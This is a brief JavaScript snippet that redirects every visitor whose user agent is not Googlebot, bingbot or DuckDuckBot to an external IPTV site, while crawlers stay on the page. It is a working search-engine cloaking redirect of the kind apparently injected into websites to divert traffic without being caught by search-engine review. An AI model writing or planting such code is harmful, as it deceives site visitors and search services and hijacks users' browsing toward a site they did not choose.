if (!navigator.userAgent.includes('Googlebot') && !navigator.userAgent.includes('bingbot') && !navigator.userAgent.includes('DuckDuckBot')) {
  window.location.href = "https://markiptv.com/";
} else {
  console.log("Bot detected, no redirect");
}
